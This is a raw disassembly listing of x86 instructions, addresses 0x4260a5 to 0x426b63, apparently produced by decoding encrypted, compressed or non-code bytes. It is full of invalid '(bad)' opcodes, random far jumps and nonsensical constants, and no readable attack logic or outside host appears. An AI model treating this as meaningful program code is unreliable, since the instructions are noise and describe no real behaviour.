  4260a5:	push   ds
  4260a6:	mov    al,ds:0x29cebe15
  4260ab:	push   cs
  4260ac:	add    dh,al
  4260ae:	pop    edi
  4260af:	or     BYTE PTR [ebp+0x74],bh
  4260b2:	scas   al,BYTE PTR es:[edi]
  4260b3:	pop    ecx
  4260b4:	adc    DWORD PTR es:[ebx-0x38e08fd6],0x767c4af8
  4260bf:	mov    edx,0x8626b1ee
  4260c4:	jge    0x4260dd
  4260c6:	out    dx,eax
  4260c7:	mov    bl,0x46
  4260c9:	xchg   esi,eax
  4260ca:	xchg   ecx,eax
  4260cb:	add    esp,ebp
  4260cd:	shl    BYTE PTR [edx-0xc83a524],0x1d
  4260d4:	(bad)  
  4260d6:	ret    0xa4d1
  4260d9:	jecxz  0x4260bd
  4260db:	lahf   
  4260dc:	add    al,BYTE PTR [esi-0x45]
  4260df:	cmp    DWORD PTR [edi+esi*4],eax
  4260e2:	das    
  4260e3:	gs je  0x426139
  4260e6:	iret   
  4260e7:	adc    dh,BYTE PTR ds:0x62d9c609
  4260ed:	not    edx
  4260ef:	jmp    0x9e4d:0xe09d6dec
  4260f6:	mov    bl,0xe
  4260f8:	aas    
  4260f9:	sub    edx,DWORD PTR [ecx-0x212736e3]
  4260ff:	and    al,0xe7
  426101:	fidivr WORD PTR [edx]
  426103:	pop    esp
  426104:	dec    eax
  426105:	jb     0x4260ab
  426107:	mov    ch,0x4b
  426109:	sub    al,0xd2
  42610b:	lds    ebp,FWORD PTR [esi+0x7d031490]
  426111:	icebp  
  426112:	(bad)  
  426113:	(bad)  
  426114:	dec    edx
  426115:	icebp  
  426116:	adc    eax,edi
  426118:	xor    DWORD PTR [edx+ebp*2],edi
  42611b:	daa    
  42611c:	mov    edx,0xc7f4aaca
  426121:	into   
  426122:	pop    es
  426123:	xor    edx,DWORD PTR [edx+eax*4-0x35]
  426127:	outs   dx,BYTE PTR ds:[esi]
  426128:	jb     0x4260b8
  42612a:	jb     0x42612b
  42612c:	mov    dl,0x98
  42612e:	push   ss
  42612f:	shr    DWORD PTR [eax-0xe],1
  426132:	retf   
  426133:	mov    cl,0x29
  426135:	call   0xc7ab:0xeac04318
  42613c:	jmp    0xcf64550e
  426141:	jne    0x426130
  426143:	jae    0x426113
  426145:	push   esp
  426146:	lock fld DWORD PTR [edi]
  426149:	sar    DWORD PTR [ebp-0x27],0x40
  42614d:	rol    BYTE PTR [ebx-0xdca782b],0xa0
  426154:	ficom  DWORD PTR [edx]
  426156:	fild   QWORD PTR [esi]
  426158:	sub    BYTE PTR [edx-0x34d0414c],ch
  42615e:	add    eax,0x95f96350
  426163:	(bad)  
  426164:	add    eax,0x7b6154e3
  426169:	prefetcht0 BYTE PTR [edx]
  42616c:	inc    edx
  42616d:	or     DWORD PTR [ecx-0x70ad64eb],esi
  426173:	js     0x4261c2
  426175:	stos   BYTE PTR es:[edi],al
  426176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426177:	mov    al,ds:0x882ab2b4
  42617c:	and    eax,0x33e74cff
  426181:	mov    edi,0x7b0e99d7
  426186:	ret    
  426187:	das    
  426188:	sbb    eax,0x540ab6ce
  42618d:	cs xchg ecx,eax
  42618f:	xchg   BYTE PTR [eax],al
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	xchg   BYTE PTR [edx],dl
  426202:	retf   0xe486
  426205:	xchg   esi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	popf   
  42620d:	mov    BYTE PTR es:[ecx+0x631ba4aa],ch
  426214:	xchg   BYTE PTR [edi+0xe],ch
  426217:	retf   
  426218:	retf   0x6fa7
  42621b:	or     ax,0xd683
  42621f:	iret   
  426220:	pop    ebp
  426221:	jg     0x4261f5
  426223:	aad    0xba
  426225:	cli    
  426226:	int    0x4a
  426228:	jo     0x426262
  42622a:	sub    al,0x65
  42622c:	(bad)  
  42622d:	imul   DWORD PTR [ecx]
  42622f:	fmul   DWORD PTR [eax]
  426231:	mov    BYTE PTR [ebx],0x11
  426234:	mov    bl,0x53
  426236:	push   ecx
  426237:	push   edi
  426238:	jle    0x426234
  42623a:	inc    esp
  42623b:	push   esp
  42623c:	fwait
  42623d:	pusha  
  42623e:	sbb    BYTE PTR [ecx-0x67e2248d],0x71
  426245:	cmp    edx,DWORD PTR [ebx+0x27]
  426248:	stos   BYTE PTR es:[edi],al
  426249:	mov    bh,0x5
  42624b:	scas   al,BYTE PTR es:[edi]
  42624c:	jne    0x426244
  42624e:	push   edx
  42624f:	aaa    
  426250:	mov    dl,0xd4
  426252:	sbb    DWORD PTR [ecx-0x1a],edx
  426255:	pop    edi
  426256:	test   BYTE PTR [edi-0x5b],0x69
  42625a:	mov    esi,0x953427aa
  42625f:	mov    ebp,ss
  426261:	xlat   BYTE PTR ds:[ebx]
  426262:	cdq    
  426263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426264:	int    0xbf
  426266:	cli    
  426267:	test   al,0x73
  426269:	xor    al,0x6b
  42626b:	push   eax
  42626c:	jmp    0x426283
  42626e:	cmp    eax,ecx
  426270:	neg    edi
  426272:	cmp    ah,BYTE PTR [eax+0x414a14f2]
  426278:	mov    ebx,0x652d26de
  42627d:	ja     0x426261
  42627f:	(bad)  
  426280:	call   eax
  426282:	movhps QWORD PTR [eax+0x769d70d4],xmm4
  426289:	jb     0x426212
  42628b:	fisttp WORD PTR [edx-0x68e3b9ad]
  426291:	sbb    eax,0x95e871f1
  426296:	push   es
  426297:	push   eax
  426298:	xor    DWORD PTR [esi+0x74babb1b],edi
  42629e:	xchg   ebx,eax
  42629f:	bound  edx,QWORD PTR [ebx]
  4262a1:	sub    eax,DWORD PTR [eax+0x4acfffb8]
  4262a7:	inc    edi
  4262a8:	fstp   TBYTE PTR ds:0x2f0fbc4f
  4262ae:	pop    ebp
  4262af:	imul   eax,DWORD PTR [ebp+edi*8-0x56ff1b72],0x4fa83117
  4262ba:	pop    esi
  4262bb:	aam    0xe
  4262bd:	and    eax,0x9c5abe9
  4262c2:	jae    0x426255
  4262c4:	cmp    BYTE PTR [esi+0x24],al
  4262c7:	or     ebx,DWORD PTR [ecx+eax*4+0x36]
  4262cb:	add    esi,edi
  4262cd:	add    dl,BYTE PTR [esi]
  4262cf:	push   edi
  4262d0:	fnclex 
  4262d2:	xchg   esi,eax
  4262d3:	cmp    al,0x34
  4262d6:	shl    esp,0xb2
  4262d9:	aad    0xe3
  4262db:	sbb    esi,DWORD PTR [esi]
  4262dd:	icebp  
  4262de:	fild   DWORD PTR [ecx+0x73d39385]
  4262e4:	daa    
  4262e5:	cmc    
  4262e6:	sahf   
  4262e7:	dec    ebx
  4262e8:	cmp    eax,0xc0970028
  4262ed:	jb     0x42628a
  4262ef:	cmp    edi,DWORD PTR ds:0x6d294fa9
  4262f5:	sar    DWORD PTR [edi],cl
  4262f7:	repz and DWORD PTR [ecx+0x16],edi
  4262fb:	es into 
  4262fd:	dec    ebp
  4262fe:	mov    fs,ebx
  426300:	outs   dx,DWORD PTR ds:[esi]
  426301:	push   edx
  426302:	clc    
  426303:	stos   DWORD PTR es:[edi],eax
  426304:	outs   dx,DWORD PTR ds:[esi]
  426305:	sbb    DWORD PTR [ebx+0xf],ebx
  426308:	mov    dh,0x61
  42630a:	add    eax,0xa362e713
  42630f:	leave  
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x49d7ff4d
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [eax-0x32],al
  42638e:	pop    eax
  42638f:	mov    ebx,0xb2d656b5
  426394:	mov    cl,0x71
  426396:	dec    ebx
  426397:	rcr    BYTE PTR [eax+0x6f],cl
  42639a:	mov    ecx,0x1f44b85e
  42639f:	mov    edi,DWORD PTR [edi-0x65]
  4263a2:	inc    eax
  4263a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263a4:	loope  0x42633a
  4263a6:	mov    ds,WORD PTR [ebp+0x1fe24a67]
  4263ac:	dec    edi
  4263ad:	mov    ss,edi
  4263af:	push   0xffffff95
  4263b1:	adc    DWORD PTR [ecx+0x47047158],ecx
  4263b7:	mov    ecx,0x57cd80de
  4263bc:	cmp    eax,0x67b5dd3c
  4263c1:	nop
  4263c2:	ret    
  4263c3:	jmp    0x4263b7
  4263c5:	ficomp DWORD PTR ds:0xd44ecf58
  4263cb:	leave  
  4263cc:	cmp    eax,0xa7916c36
  4263d1:	fild   WORD PTR [ebp+0x5534a080]
  4263d7:	push   edi
  4263d8:	scas   eax,DWORD PTR es:[edi]
  4263d9:	and    ah,BYTE PTR [edx+0xe]
  4263dc:	pop    esp
  4263dd:	call   0xcced:0xe6f80278
  4263e4:	xchg   ebx,eax
  4263e5:	mov    edi,0x3fe9ea33
  4263ea:	arpl   cx,bp
  4263ec:	(bad)  
  4263ed:	lea    ebp,[edx+0x1e]
  4263f0:	pop    eax
  4263f1:	(bad)  
  4263f2:	cmp    cl,BYTE PTR ds:0xb0619a43
  4263f8:	xchg   ebp,edi
  4263fa:	mov    ch,0x44
  4263fc:	enter  0x2887,0x7a
  426400:	jg     0x4263ad
  426402:	stc    
  426403:	ret    
  426404:	ror    BYTE PTR [eax+ebp*2+0x66],cl
  426408:	stos   BYTE PTR es:[edi],al
  426409:	jne    0x4263b0
  42640b:	xor    DWORD PTR ds:0x12c51efe,esp
  426411:	sub    al,0xc6
  426413:	(bad)  
  426414:	cmp    eax,0x6ba9d30f
  426419:	or     eax,0x181e11b5
  42641f:	(bad)  
  426421:	mov    ah,0x91
  426423:	push   ss
  426424:	retf   
  426425:	out    0xe4,al
  426427:	sub    eax,eax
  426429:	imul   ecx,DWORD PTR [ebx+0x49],0x659e7e81
  426430:	or     edx,ecx
  426432:	rcr    DWORD PTR [edi-0x6fee5403],1
  426438:	dec    ebx
  426439:	xchg   edx,eax
  42643a:	int    0x89
  42643c:	add    al,0xf
  42643e:	mov    cl,0xa2
  426440:	std    
  426441:	aas    
  426442:	adc    al,0x38
  426444:	sbb    dh,BYTE PTR [eax]
  426446:	push   esp
  426447:	and    bl,bl
  426449:	dec    esi
  42644a:	sbb    edi,esi
  42644c:	add    eax,0x72583db9
  426451:	pushf  
  426452:	dec    ecx
  426453:	arpl   sp,bx
  426455:	adc    BYTE PTR [ecx],dl
  426457:	mov    ds:0x75a04af1,eax
  42645c:	or     al,0x39
  42645e:	in     al,dx
  42645f:	loop   0x4264ab
  426461:	push   ecx
  426462:	push   ebp
  426463:	and    eax,0x6d1f2d80
  426468:	push   0xe612f7c1
  42646d:	pop    edi
  42646e:	test   BYTE PTR [ecx],bl
  426470:	xchg   ebx,eax
  426471:	sahf   
  426472:	sub    BYTE PTR [ebx+ebp*8],cl
  426475:	nop
  426476:	out    0x48,eax
  426478:	mov    ch,0x4f
  42647a:	mov    cl,0x20
  42647c:	lahf   
  42647d:	mov    ecx,0xc05ee132
  426482:	inc    ebp
  426483:	pop    ebp
  426484:	sbb    edi,DWORD PTR [esi+0x441b250f]
  42648a:	loopne 0x4264db
  42648c:	cld    
  42648d:	jg     0x426436
  42648f:	out    0x0,al
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   ecx,edx
  426501:	gs push esi
  426503:	scas   al,BYTE PTR es:[edi]
  426504:	in     al,dx
  426505:	cwde   
  426506:	add    DWORD PTR [eax],eax
  426508:	add    al,0x1
  42650a:	add    BYTE PTR [eax],al
  42650c:	int    0x91
  42650e:	push   es
  42650f:	xor    DWORD PTR [esi],esi
  426511:	iret   
  426512:	enter  0xec8b,0x64
  426516:	cmp    eax,0xe118ad5f
  42651b:	mov    al,BYTE PTR [ecx+0x79]
  42651e:	pop    ebx
  42651f:	add    ecx,esi
  426521:	popa   
  426522:	(bad)  
  426524:	test   DWORD PTR [edi+0x26],0x8813b8a8
  42652b:	sub    al,0x48
  42652d:	mov    eax,ds:0x2a8dc53c
  426532:	adc    eax,0xb7ee2709
  426537:	sahf   
  426538:	inc    edi
  426539:	stos   BYTE PTR es:[edi],al
  42653a:	gs aas 
  42653c:	test   al,0x39
  42653e:	int    0x72
  426540:	(bad)
  426543:	in     al,0x6d
  426545:	jb     0x42658b
  426547:	sbb    esi,edx
  426549:	pop    edi
  42654a:	adc    ebx,esp
  42654c:	jmp    0x87c30a3b
  426551:	xor    BYTE PTR [edi-0xf],bh
  426554:	stos   DWORD PTR es:[edi],eax
  426555:	dec    ebp
  426556:	enter  0x81e6,0xb6
  42655a:	and    al,0xec
  42655c:	cmp    BYTE PTR [ecx+0x498a0dec],cl
  426562:	pop    ds
  426563:	imul   esi,DWORD PTR [esi+0x8],0x6249ff67
  42656a:	adc    ebx,DWORD PTR [eax+0x6e8347ae]
  426570:	(bad)  
  426571:	mov    esi,0x6f2c0517
  426576:	lock repnz cmp DWORD PTR [ebp+0x5e545028],eax
  42657e:	or     ebx,edi
  426580:	or     eax,0x2e2099bc
  426585:	sbb    BYTE PTR [ebx+ebx*2],0xde
  426589:	test   al,0xd2
  42658b:	cli    
  42658c:	push   edi
  42658d:	rcl    BYTE PTR [eax-0x7726bc85],1
  426593:	mov    edi,0xb906410b
  426598:	fisub  WORD PTR [eax+0x64cb66db]
  42659e:	inc    edx
  42659f:	pusha  
  4265a0:	dec    BYTE PTR [ebx+0xd50c7f4]
  4265a6:	loop   0x4265a7
  4265a8:	add    al,0xb5
  4265aa:	outs   dx,DWORD PTR ds:[esi]
  4265ab:	dec    edi
  4265ac:	jo     0x4265f6
  4265ae:	push   ss
  4265af:	xor    eax,0x48a6ca48
  4265b4:	leave  
  4265b5:	and    eax,0x74e2811e
  4265ba:	call   0x41a0:0x9be7b87
  4265c1:	mov    bl,0x81
  4265c3:	test   al,0x6f
  4265c5:	mov    al,ds:0x6174000c
  4265ca:	dec    ebx
  4265cb:	loopne 0x426551
  4265cd:	and    BYTE PTR [edi+0x5f20727e],al
  4265d3:	std    
  4265d4:	and    ebp,eax
  4265d6:	repz (bad) 
  4265d8:	mov    edx,0x377aabb5
  4265dd:	push   es
  4265de:	mov    esp,0xf3c050d8
  4265e3:	fsubr  DWORD PTR [ebp-0x32fb7e]
  4265e9:	pop    ebx
  4265ea:	(bad)  
  4265eb:	in     eax,0xc2
  4265ed:	jb     0x4265b3
  4265ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4265f0:	and    BYTE PTR [esi-0x21cdd875],ch
  4265f6:	jge    0x42659c
  4265f8:	std    
  4265f9:	mov    dl,0xe2
  4265fb:	pop    ebx
  4265fc:	(bad)  
  4265fd:	jl     0x426596
  4265ff:	xor    edx,DWORD PTR ds:0xc30a8a66
  426605:	add    DWORD PTR [edx],eax
  426607:	sbb    edx,DWORD PTR [edi]
  426609:	lahf   
  42660a:	mov    bh,0x90
  42660c:	dec    ebx
  42660d:	mov    ah,BYTE PTR [edi]
  42660f:	mov    esi,0x0
	...
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x57e26da4]
  426682:	and    eax,0x199f0c8
  426687:	add    BYTE PTR [ecx+eax*1],al
  42668a:	add    BYTE PTR [eax],al
  42668c:	or     dl,al
  42668e:	adc    BYTE PTR [ebp+0x37],bl
  426691:	mov    cl,BYTE PTR [eax-0x43]
  426694:	stos   BYTE PTR es:[edi],al
  426695:	cwde   
  426696:	adc    al,0x52
  426698:	(bad)  
  426699:	jl     0x426715
  42669b:	fld    DWORD PTR [esi-0x8793c45]
  4266a1:	out    0x50,eax
  4266a3:	xchg   edx,eax
  4266a4:	jno    0x42667d
  4266a6:	mov    eax,ds:0x5c231f08
  4266ab:	into   
  4266ac:	and    esp,0x36
  4266af:	loop   0x42663d
  4266b1:	sbb    al,0x98
  4266b3:	add    bh,BYTE PTR [edi+0x44a67f8e]
  4266b9:	push   eax
  4266ba:	sub    DWORD PTR es:[edi],edi
  4266bd:	adc    ch,cl
  4266bf:	mov    esp,0xad7f08cf
  4266c4:	xor    al,0xcf
  4266c6:	fld    DWORD PTR [ecx+0x19b23e9e]
  4266cc:	cli    
  4266cd:	mov    al,ds:0xf18701a2
  4266d2:	mov    bh,0x4e
  4266d4:	ins    DWORD PTR es:[edi],dx
  4266d5:	push   eax
  4266d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266d7:	push   edx
  4266d8:	sbb    BYTE PTR [ebx+0x67acaaf7],ah
  4266de:	pop    edi
  4266df:	mov    al,0x3d
  4266e1:	test   BYTE PTR [edi],ah
  4266e3:	cmp    al,0x51
  4266e5:	lods   eax,DWORD PTR ds:[esi]
  4266e6:	dec    esp
  4266e7:	int3   
  4266e8:	(bad)  
  4266e9:	(bad)  
  4266ea:	test   al,0xec
  4266ec:	mov    eax,0xc1129655
  4266f1:	xchg   ebp,eax
  4266f2:	movaps xmm4,xmm1
  4266f5:	fwait
  4266f6:	dec    esp
  4266f7:	jo     0x426776
  4266f9:	sub    esp,DWORD PTR [esi-0x9]
  4266fc:	div    DWORD PTR [ebx]
  4266fe:	jmp    0xa5da72
  426703:	fisubr DWORD PTR [ebx+0x2d9394ce]
  426709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42670a:	iret   
  42670b:	and    bh,bh
  42670d:	push   ds
  42670e:	sbb    dl,bl
  426710:	mov    esi,es
  426712:	rol    DWORD PTR [edx-0x749cde10],1
  426718:	lods   al,BYTE PTR cs:[esi]
  42671a:	gs xchg ecx,eax
  42671c:	inc    ebx
  42671d:	aam    0x6c
  42671f:	xor    eax,0xf0a0847d
  426724:	sbb    eax,0xf6cca4a0
  426729:	mov    ds,WORD PTR [edi+0x3b]
  42672c:	imul   esi,DWORD PTR [edx+0x543b4f03],0xffffffee
  426733:	mov    ds:0x2bcb958e,eax
  426738:	cmc    
  426739:	jge    0x42675a
  42673b:	lahf   
  42673c:	jns    0x426738
  42673e:	idiv   DWORD PTR [ecx]
  426740:	pushf  
  426741:	mov    ah,0xda
  426743:	jecxz  0x426754
  426745:	xor    DWORD PTR ds:0x56179afc,ebx
  42674b:	adc    al,0x60
  42674d:	cld    
  42674e:	sub    BYTE PTR [edx-0x4525b586],dh
  426754:	push   ebx
  426755:	loope  0x4266de
  426757:	sub    eax,0x436e9313
  42675c:	xchg   edi,eax
  42675d:	(bad)  
  42675e:	aaa    
  42675f:	xchg   edi,eax
  426760:	ss scas al,BYTE PTR es:[edi]
  426762:	lods   al,BYTE PTR ds:[esi]
  426763:	adc    eax,0x760ad7bf
  426768:	mov    esp,0xb3895d93
  42676d:	test   DWORD PTR [ebp+0x6645d77f],eax
  426773:	arpl   WORD PTR [esi-0x48a755ef],si
  426779:	pusha  
  42677a:	add    al,0xee
  42677c:	and    al,0x3a
  42677e:	inc    edi
  42677f:	shl    BYTE PTR [ebx+0x50516130],1
  426785:	arpl   WORD PTR [ebp+0x4a9284cc],bp
  42678b:	and    al,0xb4
  42678d:	sbb    ah,bh
  42678f:	sbb    al,BYTE PTR [eax]
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	ret    0xb815
  426803:	ret    0x9af4
  426806:	add    DWORD PTR [eax],eax
  426808:	add    al,0x1
  42680a:	add    BYTE PTR [eax],al
  42680c:	sbb    eax,0x48d1149b
  426811:	int3   
  426812:	ret    
  426813:	pop    ecx
  426814:	jnp    0x426833
  426816:	icebp  
  426817:	in     al,dx
  426818:	arpl   WORD PTR [esi],dx
  42681a:	add    BYTE PTR [ebp+0x7bcfea90],al
  426820:	aam    0xe7
  426822:	cwde   
  426823:	push   edi
  426824:	(bad)  
  426825:	out    dx,al
  426826:	sub    eax,0x4c9e6925
  42682b:	mov    ah,0x1e
  42682d:	pop    ebx
  42682e:	pop    edx
  42682f:	pusha  
  426830:	jb     0x426841
  426832:	jmp    0x426870
  426834:	or     eax,0x9560ee3e
  426839:	add    eax,0x81534e29
  42683e:	or     ebp,DWORD PTR [ecx-0x45ed5813]
  426844:	shr    DWORD PTR [edi+ebp*8],1
  426847:	mov    ds:0x4c417fb,eax
  42684c:	sub    esp,DWORD PTR [esi+0x15c79bb8]
  426852:	fnstcw WORD PTR [edi+0xbb9063b]
  426858:	repnz stc 
  42685a:	sub    cl,ch
  42685c:	sbb    ch,bl
  42685e:	push   0xc6edda5f
  426863:	jp     0x426838
  426865:	jg     0x426805
  426867:	or     DWORD PTR [edi+ebx*2+0x78a02471],esp
  42686e:	mov    bl,0xaf
  426870:	hlt    
  426871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426872:	ja     0x426871
  426874:	leave  
  426875:	sbb    eax,0xd9aaa12f
  42687a:	pop    ebx
  42687b:	inc    edx
  42687c:	push   ebp
  42687d:	imul   edi,DWORD PTR [ecx],0xffffff8a
  426880:	xchg   ecx,eax
  426881:	sar    BYTE PTR [ebx],0x79
  426884:	jmp    0x21752706
  426889:	leave  
  42688a:	fiadd  WORD PTR [eax]
  42688c:	int    0x75
  42688e:	mov    al,ds:0xd525c658
  426893:	mov    bh,0xde
  426895:	mov    eax,ds:0xdf60227a
  42689a:	adc    BYTE PTR [ecx+edi*1],ah
  42689d:	nop
  42689e:	fsubr  DWORD PTR [ebx-0x52]
  4268a1:	in     eax,0xc4
  4268a3:	dec    edi
  4268a4:	enter  0x8a44,0x0
  4268a8:	dec    ebp
  4268a9:	leave  
  4268aa:	popa   
  4268ab:	std    
  4268ac:	jl     0x4268d4
  4268ae:	loope  0x4268d0
  4268b0:	push   edi
  4268b1:	ret    
  4268b2:	jne    0x42690c
  4268b4:	inc    ebx
  4268b5:	jge    0x4268e8
  4268b7:	mov    bl,0x20
  4268b9:	sbb    eax,0x70aff301
  4268be:	push   cs
  4268bf:	mov    edi,0x55515c3a
  4268c4:	addr16 jle 0x4268ef
  4268c7:	punpckhbw mm0,mm3
  4268ca:	les    edi,FWORD PTR [ebx+0xb]
  4268cd:	adc    eax,0xe7115fae
  4268d2:	sbb    BYTE PTR [ecx],dl
  4268d4:	jno    0x42688b
  4268d6:	xor    bh,BYTE PTR ds:0xc368c88a
  4268dc:	out    0xe7,eax
  4268de:	xor    edi,DWORD PTR [edx+0x4c0dfe1b]
  4268e4:	out    0x1,al
  4268e6:	or     al,0xfa
  4268e8:	mov    edx,0x60179aca
  4268ed:	jbe    0x4268e0
  4268ef:	xor    dl,BYTE PTR [ecx]
  4268f1:	mov    edx,0xdfa833c5
  4268f6:	pop    esi
  4268f7:	adc    eax,0xd05b4ced
  4268fc:	ffree  st(6)
  4268fe:	sub    ecx,edx
  426900:	mov    ecx,DWORD PTR [edi-0x5bd238e9]
  426906:	sub    eax,0x7871bf11
  42690b:	(bad)  
  42690c:	div    DWORD PTR [ebx+0xc09f]
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    eax,DWORD PTR [edi-0x68]
  426982:	cmp    ebp,DWORD PTR [eax+edi*8-0x65]
  426986:	add    DWORD PTR [eax],eax
  426988:	add    al,0x1
  42698a:	add    BYTE PTR [eax],al
  42698c:	cmp    DWORD PTR [ecx-0x7e],esi
  42698f:	xchg   esp,eax
  426990:	adc    al,0x7a
  426992:	fwait
  426993:	mov    ch,0xf6
  426995:	sbb    ebx,ebx
  426997:	xor    bl,BYTE PTR [ebx]
  426999:	(bad)  
  42699a:	pop    ss
  42699b:	and    dh,al
  42699d:	iret   
  42699e:	mov    esi,DWORD PTR [ebx-0x28]
  4269a1:	enter  0x7c7b,0xda
  4269a5:	dec    ecx
  4269a6:	cdq    
  4269a7:	and    al,0x6d
  4269a9:	or     al,0xad
  4269ab:	ret    
  4269ac:	loop   0x426975
  4269ae:	pop    ebx
  4269af:	jns    0x4269a7
  4269b1:	scas   eax,DWORD PTR es:[edi]
  4269b2:	rcr    DWORD PTR ds:0x2f5b2e91,0x18
  4269b9:	pop    ebp
  4269ba:	scas   al,BYTE PTR es:[edi]
  4269bb:	in     eax,0x11
  4269bd:	cmp    DWORD PTR [edi+edi*8+0x74],0x2434023e
  4269c5:	adc    bh,0xa9
  4269c8:	mov    edi,0x674b4780
  4269ce:	jmp    0xa694:0x5cff1c0
  4269d5:	or     eax,0x121dd58
  4269da:	pop    ebp
  4269db:	rol    cl,1
  4269dd:	outs   dx,DWORD PTR ds:[esi]
  4269de:	push   ss
  4269df:	mov    edx,DWORD PTR [ebx]
  4269e1:	lds    edi,FWORD PTR [esi-0x65173ae0]
  4269e7:	sub    esp,DWORD PTR [edx]
  4269e9:	sbb    eax,0x2b949fa8
  4269ee:	dec    ecx
  4269ef:	popa   
  4269f0:	rcr    BYTE PTR [esi+0x36],0x85
  4269f4:	(bad)  
  4269f5:	in     al,0x7d
  4269f7:	xor    eax,0x296d30ce
  4269fc:	push   esp
  4269fd:	add    DWORD PTR [edx+0x67f1d84b],0xfffffffe
  426a04:	loop   0x4269d1
  426a06:	cli    
  426a07:	ja     0x426a68
  426a09:	scas   al,BYTE PTR es:[edi]
  426a0a:	inc    edx
  426a0b:	jmp    0x9531:0x7fa8b79
  426a12:	add    al,BYTE PTR [edx+0x4d]
  426a15:	push   0x53
  426a17:	or     bh,BYTE PTR [edi-0x38e74b9e]
  426a1d:	mov    bh,ch
  426a1f:	popf   
  426a20:	bound  edx,QWORD PTR [edx-0x4c]
  426a23:	ret    
  426a24:	test   al,0x80
  426a26:	sbb    esp,0xeca2e4ef
  426a2c:	sbb    BYTE PTR [eax],bh
  426a2e:	xor    eax,0xbc04c38e
  426a33:	push   esp
  426a34:	inc    eax
  426a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a36:	cmp    ch,al
  426a38:	mov    edi,DWORD PTR [edi]
  426a3a:	pusha  
  426a3b:	adc    BYTE PTR [edi+0x7c],bl
  426a3e:	in     al,dx
  426a3f:	sub    DWORD PTR [ecx+eax*8-0x27],edx
  426a43:	xor    ebx,DWORD PTR [ebp-0x7a6c013e]
  426a49:	in     al,0x32
  426a4b:	data16 je 0x426aa2
  426a4e:	xchg   edi,eax
  426a4f:	add    eax,0xd7b2cf8a
  426a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a55:	cmp    eax,esi
  426a57:	scas   al,BYTE PTR es:[edi]
  426a58:	leave  
  426a59:	inc    edi
  426a5a:	xchg   esi,eax
  426a5b:	loope  0x426a85
  426a5d:	sbb    esp,0xde4523f2
  426a63:	mov    ebx,0x88876664
  426a68:	xchg   BYTE PTR [ecx-0x67],ch
  426a6b:	ror    bh,0x94
  426a6e:	fsub   st(0),st
  426a70:	jns    0x426a6c
  426a72:	(bad)  
  426a73:	fdivr  DWORD PTR [ebx+0x30]
  426a76:	fild   DWORD PTR [ecx]
  426a78:	dec    edi
  426a79:	or     eax,0x4a1a533b
  426a7e:	jo     0x426aab
  426a80:	xchg   esp,eax
  426a81:	dec    ebx
  426a82:	push   esi
  426a83:	jae    0x426a73
  426a85:	popf   
  426a86:	fdivr  QWORD PTR ds:0x2a823469
  426a8c:	fcomp  DWORD PTR [ecx+0x5b]
  426a8f:	xchg   ebx,eax
	...
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x77
  426b01:	cmp    BYTE PTR [ebx],dl
  426b03:	(bad)  
  426b04:	cld    
  426b05:	pushf  
  426b06:	add    DWORD PTR [eax],eax
  426b08:	add    al,0x1
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	arpl   WORD PTR [edi-0x2125b29d],cx
  426b12:	pop    ebx
  426b13:	in     al,dx
  426b14:	mov    BYTE PTR [esi-0x68],0x62
  426b18:	push   ds
  426b19:	or     DWORD PTR [esi+0x41c8e283],0x4b
  426b20:	pop    ebx
  426b21:	inc    eax
  426b22:	loop   0x426aa7
  426b24:	and    cl,BYTE PTR [edx-0x43]
  426b27:	stc    
  426b28:	jecxz  0x426b6a
  426b2a:	sub    al,BYTE PTR [ecx+0x41ccc85e]
  426b30:	pushf  
  426b31:	inc    edi
  426b32:	mov    esp,0x7a53b044
  426b37:	push   ecx
  426b38:	sbb    edx,DWORD PTR [esi]
  426b3a:	cmp    edi,DWORD PTR [eax-0x2b]
  426b3d:	mov    esi,0x5553df40
  426b42:	out    0x91,eax
  426b44:	das    
  426b45:	ficomp DWORD PTR [edi-0x18]
  426b48:	sub    DWORD PTR [ebp+0x0],edi
  426b4b:	in     eax,0xd4
  426b4d:	jle    0x426bbe
  426b4f:	xchg   esp,eax
  426b50:	jecxz  0x426bcf
  426b52:	pop    ss
  426b53:	mov    ds:0xbb881a0,al
  426b58:	mov    dl,0xf9
  426b5a:	xor    eax,0xd96b768b
  426b5f:	in     eax,0xed
  426b61:	cli    
  426b62:	pop    esi
  426b63:	push   0xffffff9c
